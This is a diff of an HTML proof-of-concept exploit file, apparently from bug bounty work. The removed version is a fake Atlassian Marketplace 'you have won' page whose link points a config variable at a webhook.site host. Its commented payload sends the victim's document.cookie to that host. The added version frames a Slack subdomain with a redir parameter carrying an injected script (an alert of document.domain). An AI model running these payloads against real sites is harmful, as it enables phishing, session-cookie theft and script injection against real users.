@@ -1,38 +1,14 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Atlassian Marketplace - Special Offer</title>
-    <style>
-        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
-        .button { background-color: #0052cc; color: white; padding: 15px 25px; text-decoration: none; border-radius: 5px; }
-    </style>
+    <title>Faizan's XSS PoC</title>
 </head>
 <body>
-    <h1>You have won a free Marketplace App!</h1>
-    <p>Click below to claim your reward on the official Atlassian site.</p>
+    <h1>Slack DOM XSS Exploit</h1>
+    <p>Niche wale link par click karein (This simulates a victim clicking a link in a frame):</p>
     
-    <!-- Attacker-controlled link that injects the webhook into the site's config -->
-    <a href="https://marketplace.atlassian.com/apps/1221796/dependency-mapper-tracking-planning-risk-mapping?hosting=cloud&mpacBaseUrl=https://webhook.site/6f27e14e-934d-4e84-ae43-9fed74b1744f" 
-       class="button" id="claimButton">Claim Reward</a>
-
-    <script>
-        // Attacker's Logic:
-        // 1. Victim is lured to this page.
-        // 2. Once they click the link, they land on Atlassian with our hijacked variable.
-        // 3. Since 'window.applicationConfig.mpacBaseUrl' is now pointing to our webhook,
-        //    the attacker only needs a small script injection (XSS) on the target page 
-        //    to run the following logic automatically:
-        
-        /* 
-           --- THE PAYLOAD ---
-           var src = window.applicationConfig.mpacBaseUrl + "/log?cookie=" + btoa(document.cookie);
-           var img = new Image();
-           img.src = src;
-        */
-        
-        console.log("PoC Loaded. Attacker is waiting for the victim to click the link.");
-    </script>
+    <iframe src="https://nitrotoken.slack.com/?redir=test';alert(document.domain);'" 
+            style="width:500px; height:300px; border:1px solid red;">
+    </iframe>
 </body>
 </html>
